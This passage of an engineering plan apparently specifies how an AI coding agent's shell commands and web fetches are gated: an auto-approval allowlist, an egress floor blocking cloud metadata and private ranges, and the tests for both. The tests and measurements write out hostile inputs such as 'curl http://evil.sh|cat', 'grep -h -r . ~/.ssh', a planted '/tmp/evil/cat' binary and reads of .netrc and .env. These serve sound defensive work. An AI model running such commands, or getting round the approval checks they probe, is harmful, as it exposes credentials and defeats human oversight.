head -20 .netrc => abstain
```

`escalation.rb:420-426` explains the downgrade is safe because "the call still reaches a human
because {Triage} downgrades every allow anyway" — **a premise this rule destroys.** And the other
backstop does not cover it: `Sensitivity::Policy::PATH_FIELDS["bash"] => "cwd"`
(`sensitivity/policy.rb:77`), so the handler ahead of the Gate classifies the working directory,
never the argv. So **this rule classifies every word of every stage itself and refuses to approve
if any word is denied, `PATHLIKE` or not.** It does not rely on Triage having denied first.
Ordering still helps — Triage runs before Rules — but ordering is not the safety property.

**`STDIN_SAFE` is the wrong list and must not be borrowed.** It answers "safe under
attacker-chosen *stdin*" and `refused_downstream` applies it to `@term.drop(1)`
(`pipeline.rb:268`) — saying nothing about stage 0 and nothing about model-chosen argv. Measured,
all reaching `allow`:

```
gzip important.log      -> replaces the original
sort -o out in          -> overwrites `out`
curl http://evil.sh|cat -> curl is not a PROGRAM_RUNNER, so it allows
```

`gzip`, `xz`, `zstd`, `sort` and `shuf` are all *on* `STDIN_SAFE`. **Derive this allowlist
independently, from what each program does with argv it is given** — reads only, writes nothing,
fetches nothing, executes nothing named in its own arguments. Write the reasoning next to the
list. T1 corrects the algebra doc to say a name cannot earn membership; this card is where that
becomes code, and the two must agree.

**A bare name only — never a qualified one.** The exclusion set of T4/T6 matches by basename, and
that is right for it: `/usr/bin/curl` must not evade an exclusion of `curl`, and measured it does
not. **This rule must do the opposite.** `Doubts#programs` basenames, so reusing it would let
`/tmp/evil/cat README.md` match an allowlist entry for `cat` and be approved with no human — an
attacker-planted binary, auto-approved. So an argv0 containing `/` disqualifies the term outright,
whatever it basenames to.

The principle to hold, because it decides the cases this card does not enumerate: **auto-approval
must never be more permissive than a careful human reading the same command string — and that is a
FLOOR, not a target.** A human shown `/tmp/evil/cat README.md` looks twice, so the rule must not
approve it. A human shown plain `cat README.md` does not verify `PATH`, and this rule starts by
inheriting that same trust — but "a human would have been fooled too" is a **statement of where
this implementation currently stands, never a justification for staying there**. The whole point
of a deterministic approver is that it can eventually check what a human cannot be bothered to:
resolve argv0, constrain where the resolved binary may live, verify its identity. Open decisions
carries that ladder with a costed rung at each step, and **Defense in depth** states
which rung this chunk leaves us standing on.

**Build the rule so those rungs bolt on.** The check is a conjunction of independent predicates
over one term — the decision allows, every argv0 is a bare name, every name is on the allowlist,
none is excluded, no word is classified as denied. A sixth and seventh predicate must be addable
without restructuring the rule or re-deriving its ACs. Do not fuse the checks into one pass that
happens to answer all of them at once; a reader adding "and the resolved path is under a trusted
prefix" should have exactly one obvious place to put it.

**Carry a starter allowlist, with a reason and a disqualifying-flag list per entry.** The
allowlist is the highest-risk artifact in this chunk and a rule stated in prose hands the whole
judgement to one implementing agent — v1's defect was importing the wrong list. Propose:

| program | why it is on the list | disqualifying flags |
|---|---|---|
| `cat` | reads exactly its arguments, writes nothing | none known |
| `head`, `tail` | prefix/suffix of exactly their arguments | none known |
| `wc`, `nl` | counts/numbers exactly its arguments | none known |
| `grep` | reads exactly its arguments **when not recursing** | `-r`, `-R`, `--recursive`, `--include`, `--exclude`, `-f`, `--file`, `-d recurse` |
| `sort` | reads its arguments — **but `-o` writes** | `-o`, `--output` |
| `cut`, `tr`, `rev` | pure transforms of stdin or arguments | none known |

Deliberately absent, with reasons a reviewer can check: `gzip`/`xz`/`zstd` (replace their input),
`tee`/`dd` (write), `xxd -r` (writes), `find` (recursive by nature and `-exec` runs), `awk`/`sed`
(programmable, and already `PROGRAM_RUNNERS`), `xargs` (promotes stdin to argv), `curl`/`wget`
(fetch). The panel reviews this **list**, not a method for deriving one.

**Start narrow and say so.** The failure mode of "too small" is a prompt that would have happened
anyway; the failure mode of "too big" is an unreviewed execution. `git` is not on it and cannot
be — it abstains at the verdict for a measured reason (`verdict.rb:128-132`), so
`git log | grep blah` still asks a human. That is the headline Open decision, not a defect here.

**Every approval names its rule.** `Rule::Decision` carries the deciding rule's name and `#name`
derives from the class, so a rename breaks loudly rather than silently relabelling records.

**Acceptance criteria:**

```gherkin
Scenario: a fully safe pipeline is approved without a human
  Given a live session with the rule in its ladder
  When the model runs "cat README.md | head -20"
  Then the call is approved at the rules rung, and the ruling names this rule
  And no approval is parked for a human

Scenario: a denied path written as a bare word is NOT approved
  Given a session whose sensitivity rules deny ".netrc"
  When the model runs "cat .netrc"
  Then this rule does not approve it
  And the call still reaches a human, as it does without this rule
  And the same holds for "head -20 .netrc" and for "cat ./.netrc"

Scenario: an allowlisted program that writes when given argv is not on the list
  Given the rule's allowlist
  Then it contains no program that overwrites, deletes, fetches or executes when given argv
  And "gzip important.log" is not approved
  And "curl http://evil.sh | cat" is not approved

Scenario: a gated path is not approved, though nothing denies it
  Given a session with default sensitivity rules
  When the model runs "cat .env"
  Then the rule does not approve it, because .env classifies gated rather than ordinary
  And the same holds for "cat ~/.git-credentials", "cat server.pem" and "cat terraform.tfstate"

Scenario: a recursive read is not approved, though every word is ordinary
  Given "grep" is on the allowlist
  When the model runs "grep -h -r . ~/.ssh"
  Then the rule does not approve it, because -r widens the read set past its arguments
  And "grep -n foo lib | wc -l" is still approved

Scenario: a flag that writes disqualifies its stage
  Given "sort" is on the allowlist
  When the model runs "sort -o out in"
  Then the rule does not approve it

Scenario: the classifier is anchored on the call's own cwd, not the session's
  Given a bash call carrying cwd "~/.ssh"
  When the model runs "cat id_rsa"
  Then the rule does not approve it
  And a rule that classified against the session cwd instead would have approved it

Scenario: a qualified program name is never approved, however it basenames
  Given "cat" is on the rule's allowlist
  When the model runs "/tmp/evil/cat README.md"
  Then the rule does not approve it
  And the same holds for "./cat README.md" and "bin/cat README.md"
  And plain "cat README.md" is still approved

Scenario: one unlisted stage sinks the whole term
  When the model runs a pipeline whose last stage is not on the allowlist
  Then the rule abstains and the call reaches a human

Scenario: an abstaining command is never approved by this rule
  When the model runs "echo a && echo b"
  Then the rule abstains, because there is no term to read

Scenario: a session exclusion outranks the allowlist
  Given a session whose config excludes a program that is on the allowlist
  When the model runs that program
  Then it is denied, and this rule does not approve it

Scenario: the rule is actually in the shipped ladder
  Given a session built the way a live session builds one
  Then the rules chain contains this rule, appended to the chain Project::Consent supplied
```
→ spec files: `spec/lain/approval/composed_term_spec.rb`,
`spec/lain/cli/wiring/board_build_spec.rb`

**Escalation triggers:**
- **If any allowlist candidate can write, delete, fetch or execute when handed model-chosen argv,
  it does not belong on the list.** When in doubt about a program, leave it off and say so in the
  handback — a refusal costs a prompt, a wrong entry costs an execution.
- If this rule can approve any command containing a word the session's classifier denies — in
  **any** spelling, bare or path-like — **stop immediately.** That is the defect this card was
  rewritten to prevent and it is not fix-forward.
- If the classifier is not reachable from a rule without duplicating `Triage`'s factory handling
  (`escalation.rb:459-478` is emphatic that the factory must be TOTAL, because `cwd` is
  model-controlled and a raise there becomes a fault that turns a deny into an abstention), stop
  and report — that totality is a security property, not tidiness.
- **If the rule's word predicate is spelled "not denied" rather than "is ordinary", stop.** That
  is a reproduced blocker, not a style preference: the whole gated tier — `.env`, `*.pem`,
  `.git-credentials`, `terraform.tfstate` — is "not denied".
- If a program is added to the allowlist without a disqualifying-flag entry, stop. "None known" is
  a claim someone made after reading the flags; a blank is a claim nobody made.
- If this rule ends up asking `Doubts#programs` — or anything else that basenames — for its
  allowlist check, **stop**. That method is built for the exclusion set, where basenaming is the
  correct and verified behaviour, and it is the wrong direction here.
- If `Shell::Pipeline::STDIN_SAFE` is private to `Pipeline` and the rule wants it anyway, that is
  the signal the card has drifted back to the wrong list. Do not duplicate it; re-read the two
  measurements above.
- Under `/mode auto` the ladder is not consulted, so this rule decides nothing there. If that
  turns out to be false — if `ApproveAll` somehow routes through the ladder — stop, because every
  safety argument here assumes the attended path.

### T10 — A manual-QA scenario for the shell subsystem [wave 6] [risk: low]

**Depends on:** T2, T7, T9, T11
**Files:** create `planning/qa/scenarios/shell-terms.md`; modify `planning/qa/README.md`
**Reuse:** `planning/qa/scenarios/survey.md` as the structural model — the precedent for a
scenario owning a subsystem nobody scheduled (`README.md:59-61`).
`prompt-slots-and-roles.md` for a scenario that is mostly zero-model sections with one paid step.
`planning/qa/method.md:714-736` on `/ruby` as the zero-token instrument: "a constant read from a
file is a claim about the repo, a constant read through `/ruby` is a claim about the process
under test."
**Shared-file wiring:** none
**Reachable from:** documentation. This card produces a driver-followable document, not code.

`lib/lain/shell/` has **zero** manual-QA coverage. No scenario mentions `Shell::Verdict`,
`Parse`, `Pipeline`, the term arm or arm selection; the five scenarios that touch `bash` use it
as a vehicle for something else. It is not in `README.md`'s "Known gaps" either — the gap is
invisible.

Follow the directory's conventions exactly: a single `# Scenario:` H1; a bolded **What it
exercises** naming classes with `file.rb:line` citations; **The question it answers**; a
**Cost** line with a per-section paid/free split; a **Needs** line; a `---`; then
`## <n> — <title>` sections; and a closing un-numbered section saying what it does not cover.

**Most of this is deterministic and belongs in the regression gate** — `README.md:97,179` states
that rule twice. `/ruby Lain::Shell::Verdict.new.call("…")` answers arm selection with no model
call, and this plan's Grounding table is the starting set of expected values.

Sections it must cover, at minimum: arm selection across allow/abstain/deny through `/ruby`; the
config deny path, which is new and has never been driven; that a fully safe pipeline is approved
with no prompt **while `cat .netrc` under a denying config still reaches a human** — the negative
control matters more than the positive one here; that the shell-arm record appears in **both**
attended and `/mode auto`; that `--exec docker` runs an ordinary pipeline; **that `web_fetch`
refuses `http://169.254.169.254/latest/meta-data/` and follows no redirect into a blocked range**
(T11 — zero-model, and it closes a presently exploitable gap, so the standing rule puts it in the
cheap set); and one paid section reading the arm distribution back out of a real session's
journal.

**Name the three postures explicitly**, because they decide differently and a driver who conflates
them will file a false finding: attended runs the ladder, `/mode auto` replaces it with
`ApproveAll` so neither the exclusion table nor the approval rule fires, and a session with no
queue gets the one-rung `Unattended` deny-all ladder (`switchboard.rb:265,385-396`).

Then place it in a tier and **say which** — `README.md:96-102` records `prompt-slots-and-roles`
having "sat in no tier at all: described here, scheduled nowhere", the exact failure this card
must not repeat. While in the README: its scenario count says fifteen, the directory holds
sixteen. Correct it.

Everything the scenario predicts is a prediction until a round drives it (`README.md:246-253`).
Say so.

**Acceptance criteria:**

```gherkin
Scenario: the scenario is followable by a driver who was not here
  Given planning/qa/scenarios/shell-terms.md
  Then it carries a Cost line splitting paid from free sections, and a Needs line
  And every section states an expected literal string or constant

Scenario: the deterministic sections need no model
  Then each names the /ruby expression that answers it

Scenario: the scenario is scheduled, not merely described
  Given planning/qa/README.md
  Then shell-terms appears in a tier table and in the regression gate list
  And the README's scenario count matches the directory

Scenario: it covers what this chunk built, including the negative controls
  Then it drives the config deny path, the safe-pipeline approval, the bare-word denied
    path that must NOT be approved, the shell-arm record in both attended and auto mode,
    and a pipeline under --exec docker
```
→ no spec file; the artifact is the document, checked against `planning/qa/README.md` and
`.claude/skills/manual-qa/SKILL.md`.

**Escalation triggers:**
- Every expected string must be read from the code **after** T2, T7 and T9 land, not from this
  plan's Grounding table, which was measured before them. If one cannot be verified against the
  merged tree, say so in the scenario rather than guessing.
- If driving a section needs a surface that does not exist (there is no `lain ledger` command —
  `method.md:693-712`), name the gap; do not invent one.
- `method.md:693-712` lists three ways a check passes while asserting nothing. A section with
  that shape is worse than no section — report it.

### T11 — `web_fetch` refuses the destinations no agent should reach [wave 1] [risk: medium]

**Depends on:** none
**Files:** modify `lib/lain/tools/web_fetch.rb` (`egress_problem` at :434-441); modify
`spec/lain/tools/web_fetch_spec.rb`
**Reuse:** `egress_problem` (`web_fetch.rb:434-441`) is exactly the right seam and already has
the right shape — it returns a named refusal string or nil, runs **before** any connection, and
`follow` (`web_fetch.rb:363-371`) re-applies it on **every redirect hop**, with a comment saying
so. `ALLOWED_SCHEMES` is the model for a constant this class owns and enforces unconditionally.
**Shared-file wiring:** none
**Reachable from:** `Wiring::ToolsetBuild` → `BaseTools.build` → `Lain::Tools::WebFetch.new`
(`base_tools.rb:24`). **Deliberately reachable without touching that line** — see below.

Measured against a production-shaped `WebFetch`:

```
https://example.com/x                      PERMITTED
http://169.254.169.254/latest/meta-data/   PERMITTED   <- cloud instance metadata
http://localhost:6379/                     PERMITTED   <- whatever is listening locally
file:///etc/passwd                         refused (the scheme guard works)
```

The host allowlist exists, is written, and is tested — and `base_tools.rb:24` constructs the tool
with no argument, where `allowlist_problem` returns nil ("no restriction") for a nil allowlist
(`web_fetch.rb:448-455`). So the scheme guard is the only egress control production has.

**The fix is a floor the class enforces itself, NOT another injected collaborator, and that is the
whole design decision.** This chunk's **Defense in depth** section names an unwired guard as a
recurring defect shape and this is its third instance; answering it with a fourth optional seam
that a wiring line must remember to fill would be repeating the mistake in the act of fixing it.
So: refuse non-routable destinations unconditionally, as a property of the tool, with no
constructor argument and no way for a caller to forget. The existing optional domain allowlist
stays exactly as it is, for a project that wants to narrow *further* — a floor and a ceiling, not
two spellings of one thing.

What the floor covers, lexically, from the URL's host: loopback (`127.0.0.0/8`, `::1`,
`localhost`), link-local — **`169.254.0.0/16` is the one that matters, it is where every major
cloud serves instance credentials** — the RFC1918 private ranges, IPv6 unique-local, `0.0.0.0`,
and the `.internal` / `.local` suffixes. Because `follow` re-applies the guard per hop, a redirect
into any of these is refused for free; write a spec proving that rather than assuming it.

**State the limit honestly, because this is rung one of two.** The check is lexical, so it stops
`http://169.254.169.254/` and does **not** stop `http://evil.com/` whose A record points there.
Closing that needs resolution before connect plus connecting to the resolved address, or DNS
rebinding reopens it between check and connect — real work, named as the next rung in **Defense in
depth**, not attempted here. Nothing in this file resolves a name or sees an address today (no
`Resolv`, no `IPAddr`, no `Socket`), so rung two is a genuine change in what this class does, not
a widening of what it already does.

**A refusal must say which rule fired.** `web_fetch`'s existing refusals name themselves
(`"web_fetch: host … is not on the allowlist"`); a blocked-range refusal that reads the same as an
allowlist miss would send a reader to the wrong config.

**Acceptance criteria:**

```gherkin
Scenario: the cloud metadata endpoint is refused by default
  Given a web_fetch tool built the way a live session builds one, with no allowlist configured
  When it is asked for "http://169.254.169.254/latest/meta-data/"
  Then it refuses without connecting
  And the refusal names the blocked range rather than the allowlist

Scenario: loopback and private ranges are refused by default
  Given the same tool
  Then "http://localhost:6379/", "http://127.0.0.1/", "http://[::1]/" and "http://10.0.0.1/"
    are each refused without connecting

Scenario: ordinary public hosts still work
  Given the same tool
  When it is asked for "https://example.com/x"
  Then the egress guard permits it

Scenario: a redirect into a blocked range is refused too
  Given a response redirecting to "http://169.254.169.254/"
  When the redirect is followed
  Then it is refused, because the guard re-runs on every hop

Scenario: the optional allowlist still narrows further, and cannot widen past the floor
  Given a configured allowlist naming a host that resolves inside a blocked range literally
  Then the blocked range still refuses it
```
→ spec file: `spec/lain/tools/web_fetch_spec.rb`

**Escalation triggers:**
- If any existing spec or fixture fetches a loopback or private address — a stubbed local server
  is the likely shape — this card breaks it. **Stop and report**: a test-only exemption is a hole
  in exactly the guard being added, and the orchestrator decides whether the fixture moves to a
  public-shaped host or the guard gains a seam it should not have.
- If `web_fetch` turns out to be constructed anywhere with a non-nil allowlist that this floor
  would now contradict, report it rather than reconciling them silently.
- If implementing the floor requires resolving a hostname, **stop** — that is rung two, it carries
  a TOCTOU problem this card does not solve, and doing it halfway is worse than not doing it.
- `web_fetch`'s `#requires_approval?` is deliberately `false` (`web_fetch.rb:16-18`: "a subagent
  that owns this tool gets no Gate, so a `true` here would be a no-op, and the real safety is the
  structure, not a gate"). If this card is tempted to make it `true`, that comment is why not.

## Integration checks

Run after the last wave lands, from a tree with nothing else in flight.

1. **The suite, and its example COUNT.** `bundle exec rake pspec` under the mise environment
   (`ruby@4.0.6`, `LD_LIBRARY_PATH`, `TMPDIR`) — 0 failures **and** an example count at or above
   the pre-chunk baseline plus the new examples. `parallel_tests` reports only the examples that
   survived, so a dead worker, an OOM kill and a `SystemExit` all look like a pass. Record the
   baseline before wave 1 starts.
   Before believing a red run: `pgrep -cf 'mise/installs/ruby/[0-9.]*/bin/parallel_rspec'` must
   read 0, and `pgrep -f '[p]re-commit'` too.
2. **`bundle exec rubocop`** — bare, never naming a file. Zero offences. **No `Metrics/*` limit
   is loosened by this chunk**; a tripped cop means a missing collaborator. Note that
   `rubocop -a` deletes `private` inside `declare` blocks via `Lint/UselessAccessModifier` —
   check any `Declarative` class this chunk touches for silently-publicised methods.
3. **`pre-commit run --all-files`** — all hooks.
4. **`cargo test && cargo clippy --all-targets -- -D warnings`** — this chunk should touch no
   Rust at all. If any card changed `crates/`, that is an escalation that already happened; run
   these and say so. Otherwise state explicitly that no crate changed rather than skipping
   silently.
5. **`bundle exec rspec spec/output_discipline_spec.rb`** — T7 adds journalling; nothing outside
   `lib/lain/frontend/` may touch `$stdout`/`$stderr`.
6. **The `Ractor.shareable?` spec** for value objects — T5 adds a record, and T8 adds a derived
   reader to a `Data` without adding a member.
7. **A live end-to-end proof that the chunk's headline capability is reachable**, run by hand and
   not by a spec: start a real session, run `cat README.md | head -20`, and confirm from the
   journal that it was approved at the rules rung, that no approval parked, and that a shell-arm
   record names the term arm. Then run the same command under `/mode auto` and confirm the
   shell-arm record still lands. **If this cannot be demonstrated, the chunk has not shipped**,
   whatever the suite says.
8. **Six negative controls for that same claim**, each of which a too-permissive rule would
   fail while still passing check 7:
   - a pipeline with one unlisted stage still parks for a human;
   - with `.netrc` denied in `[sensitivity]`, **`cat .netrc` still parks for a human** — the
     bare-word spelling, not `./.netrc`. This is the escalation the review panel demonstrated
     against an earlier draft of T9 and it is the single most important check in this list;
   - `gzip somefile` is not approved, though `gzip` sits on `Shell::Pipeline::STDIN_SAFE`;
   - **`/tmp/evil/cat README.md` is not approved**, though `cat` is on the allowlist and the
     name basenames to it. Create the shim and confirm it did not run;
   - **`cat .env` still parks for a human**, with a real `.env` present. It classifies *gated*,
     not denied, and a rule spelled "not denied" approves it — a reproduced blocker from the
     second review pass;
   - **`grep -h -r . ~/.ssh` still parks for a human**, with real keys present. Every word of it
     classifies *ordinary*, so word classification alone does not refuse it — the disqualifying
     flag does. Confirm no key material was printed. This is the other reproduced blocker, and it
     is the check most likely to regress, because the flag list is hand-maintained.
9. **Egress floor, driven by hand:** `web_fetch` on `http://169.254.169.254/latest/meta-data/`
   refuses **without connecting**, and a redirect into a blocked range is refused on the hop.
   Confirm an ordinary public fetch still works — a guard that refuses everything passes the first
   half of this check and fails the point of it.
10. **`--exec docker` runs an ordinary pipeline** rather than returning a tool error — the
   user-visible fix from T3. Needs a docker daemon; if unavailable, say so rather than marking
   it done.
11. **Manual QA pass**, owed to a human at a real cockpit: drive
    `planning/qa/scenarios/shell-terms.md` end to end per `.claude/skills/manual-qa/SKILL.md`,
    in the sandbox that skill's Phase 2 proves. Every expected string in that scenario is a
    **prediction** until a round drives it; the first round should expect to correct the
    document as much as to find defects, and should say which it did. **This is not
    orchestrator-runnable and must not be marked done by the executing session.**
12. **Ticket references:** `bin/comment-census --check-tickets` clean. This chunk writes new
    comments in `lib/` and `spec/`, and the ban has no exempt tier — a reason in words replaces a
    citation, and the surrounding sentence is never deleted just to lose a number.
13. **Comment density:** `bin/comment-census` on the files this chunk touches, written toward
    `lib/lain/timeline.rb`'s measured shape rather than toward a ratio.

---

## Execution log

**Base ref: `main`.** Established 2026-08-26 at the top of execution, and it is the branch every
card lands on. Where the refs sat at that moment:

| ref | sha | relation to the base |
|---|---|---|
| `main` | `18065ecf` | the base |
| `origin/main` | `b1927ce7` | **54 behind** — the remote has not been pushed; never fork a worktree from it |
| `survey/dogfood-2026-08-25` | `12e5715c` | 5 behind, and its working tree carries another session's uncommitted edits in ~16 files including `planning/qa/README.md`, which T10 modifies |

`main` is `12e5715c` (the Grounding commit) plus three commits, and **`git diff --stat
12e5715c..main` touches `ROADMAP.md` and two planning docs only** — no `lib/`, no `spec/`. So
every `file.rb:line` citation in Grounding holds verbatim against the base. Spot-checked before
the first spawn: `exec.rb:13-36`, `core.rb:75-87`, `docker.rb:151-161`, `bash.rb:105-147`,
`verdict.rb:155-220`, `config.rb:110-125`, `web_fetch.rb:355-375,425-460`, and the three unit
indexes.

Because commits land as waves do, the head moves and every base goes stale again — worktrees are
re-cut from the then-current `HEAD` at the top of each wave, never from a ref resolved earlier.

**Pre-chunk suite baseline, measured on the base ref: 16,176 examples, 0 failures, 15 pendings**
(`bundle exec rake pspec`, 80s). Integration check 1 compares against this number, not against a
failure count alone.

### Cards

- [x] T1 — algebra doc correction — `174fad5e` (the closure is real; its safety content is the audited list)
- [x] T2 — honest tool descriptions — `0bb167b1` (the rule now covers shell escapes, not just argument-runners)
- [x] T3 — `#takes_term?` and the arm chooser — `1d97c490` (contract made executable, not aspirational)
- [x] T4 — excluded-programs config table — `173dcd5d` (the deny path is reachable from config)
- [x] T5 — shell-arm journal record — `3b9d8fba` (its own spec is its only coverage; the sweeps cannot build it)
- [x] T6 — one verdict, injected at both seams — `e92a97d6` (sameness is structural; the deny path is reachable)
- [ ] T7 — bash journals its arm
- [ ] T8 — `Rule::Call` carries a derived term
- [ ] T9 — the composed-term approval rule
- [ ] T10 — shell manual-QA scenario
- [x] T11 — `web_fetch` egress floor — `fde1a0be` (metadata, loopback and RFC1918 refused before connecting)

### Landed, in order

`173dcd5d` T4 · `3b9d8fba` T5 · `174fad5e` T1 · `1d97c490` T3 · `ede7d5cf` census ·
`fde1a0be` T11 · `0bb167b1` T2 · `e92a97d6` T6

`ede7d5cf` is orchestrator-owned and belongs to no card: `NAT64` was reported
UNCLASSIFIED by `bin/comment-census --check-tickets` when T11 wanted it in prose.
CLAUDE.md's rule is to **teach the enumerated classifier before sweeping**, so the
token was added rather than the comment bent around it.

### Toolchain notes earned during execution

Three traps cost real time here and are recorded so the next run does not re-pay them.

1. **`pgrep -f 'parallel_rspec'` matches its own waiting shell**, so CLAUDE.md's
   concurrency gate written as a `while` loop never exits. Write it `parallel[_]rspec`.
   Separately, `pgrep -cf` read `1` for one agent because it matched *another agent's
   waiter loop*, whose command line embeds the pattern — CLAUDE.md's stated `ps | grep`
   over-count trap reaching `pgrep` itself.
2. **A killed suite run leaves a truncated `tmp/parallel_runtime_rspec.log`** — 69 lines
   against 638 spec files — and the next `--group-by runtime` run dies with
   `RuntimeLogTooSmallError`, which reads exactly like a code failure. `rm -f` it. The
   killed run's `parallel_rspec` children also **outlive the aborted `git commit`**.
3. **A commit whose hook runs the suite needs more than two minutes.** Killing it mid-hook
   is what produces trap 2.

### Two follow-on cards this chunk earned, and they are scheduled rather than noted

**`Wiring::ProjectPolicy`.** `CLI::Wiring` now measures **exactly 110/110 `ClassLength`** with no
compression left. T6 funded its two new lines by converting `#quiescent?` to an endless method —
honestly named as compression, not extraction — and the panel's Metz seat approved landing on
that basis *only* because the missing object is not load-bearing for T6's properties: the memo
already makes sameness structural. The object it stands in for is real and named: the three
config-derived authorities a session resolves once from its `Project` — the shell verdict, the
`[sensitivity]` table, and the consented `[approval]` rules. `BoardBuild.shell_verdict` is the
tell: the board does not hold that authority, it builds it and hands it straight back, and its
only relation to the board is that both read one file.

**What a deny should mean at the tool.** Measured through the real `Tools::Bash` over a recording
backend: `curl http://example.com` with no table reaches `allow` and runs as argv through
`execvp`; with `exclude = ["curl"]` it reaches `deny` and runs as **`sh -c`**. `#arm_for` is
`decision.allow? ? term : string`, so `deny` and `abstain` are the same arm and **a restricting
table moves an excluded program onto the less constrained arm.** Attended sessions never reach
the tool — the rung denies first — but `/mode auto`'s `ApproveAll` and `Subagent::UNGATED` both
do. Recorded at `base_tools.rb` where the arm is chosen, and named as the next rung on the *what
reaches a shell* axis. Not fixed here: what a deny should mean at the tool is a design question,
not a patch.

### A defect shape this chunk produced five times

**A comment stating a reason nobody ran.** Two were caught by review; three only by asking a card
to audit its own explanatory claims after the fact. In each case the conclusion was right and the
*reason* was false — which is worse than no comment, because a stated why reads as measured.
Instances: `IPAddr` strips brackets so the `hostname`/`host` choice had no safety consequence; a
dot-stripping rule "would change what every other host is matched against" (it changes 4 of 34);
"IPv6 transition space, **every prefix of which** carries a v4 address" (false for `fec0::/10`);
"nothing in `lib/` ever built another `capability_set`" (inherited from this plan, not run — it
does hold); and `Shell::Parse` described as value-equal (`Parse.new == Parse.new` is `false`).

**The tell, four times out of five, was a quantifier** — *every other host*, *every prefix*, *both
collaborators*, *nothing in `lib/`*. Every card after this one is asked to run the same audit and
to report it even when clean.
